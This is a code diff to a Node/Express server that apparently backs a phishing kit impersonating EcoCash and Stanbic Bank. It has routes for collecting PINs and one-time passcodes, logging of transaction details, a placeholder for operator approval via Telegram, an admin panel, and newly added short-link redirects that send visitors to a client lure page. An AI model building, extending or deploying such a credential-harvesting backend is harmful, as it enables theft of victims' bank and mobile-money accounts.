@@ -43,7 +43,7 @@ app.post('/api/links', (req, res) => {
   res.json({ code });
 });
 
-// Fetch link by code
+// Fetch link by code (used by client.html?r=CODE)
 app.get('/api/links/:code', (req, res) => {
   const code = String(req.params.code || '').toUpperCase();
   const payload = links.get(code);
@@ -59,7 +59,6 @@ app.get('/api/links/:code', (req, res) => {
 app.post('/api/shorten', (req, res) => {
   const url = req.body && req.body.url;
   if (!url) return res.status(400).json({ error: 'Missing url' });
-  // Just echo it back; the admin already has a short link
   res.json({ shortUrl: url });
 });
 
@@ -67,7 +66,6 @@ app.post('/api/shorten', (req, res) => {
    Verification routes (PIN + OTP flows)
    ──────────────────────────────────────────────────────────── */
 
-// PIN verification (used by processing.html)
 app.post('/api/verify/send', (req, res) => {
   const body = req.body || {};
   const requestId = 'req-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6);
@@ -76,11 +74,9 @@ app.post('/api/verify/send', (req, res) => {
 });
 
 app.get('/api/verify/status/:id', (req, res) => {
-  // Placeholder: always pending until you wire Telegram approval
   res.json({ status: 'pending' });
 });
 
-// OTP request (used by ecocash.html / stanbic verification)
 app.post('/api/verification/otp', (req, res) => {
   const body = req.body || {};
   log('OTP request | tx=' + (body.tx || '-') + ' | am=' + (body.am || '-') + ' ' + (body.cur || ''), 'info');
@@ -94,7 +90,6 @@ app.post('/api/verification/submit', (req, res) => {
 });
 
 app.get('/api/verification/status/:ref', (req, res) => {
-  // Placeholder decision
   res.json({ decision: 'pending' });
 });
 
@@ -106,13 +101,28 @@ app.get('/api/logs', (req, res) => {
 });
 
 /* ────────────────────────────────────────────────────────────
+   Root-level short link redirect
+   /ABC12345 -> /client.html?r=ABC12345
+   Must come BEFORE app.get('/')
+   ──────────────────────────────────────────────────────────── */
+app.get('/:code([A-Z0-9]{6,12})', (req, res) => {
+  const code = req.params.code.toUpperCase();
+  if (links.has(code)) {
+    log('Short link ' + code + ' -> client.html', 'ok');
+    return res.redirect(302, '/client.html?r=' + encodeURIComponent(code));
+  }
+  log('Unknown short link: ' + code, 'err');
+  return res.redirect(302, '/');
+});
+
+/* ────────────────────────────────────────────────────────────
    Fallback — only for "/" not for every path
    ──────────────────────────────────────────────────────────── */
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// Unknown paths → 404 (don't serve admin.html for everything)
+// Unknown paths → 404
 app.use((req, res) => {
   res.status(404).send('Not found');
 });
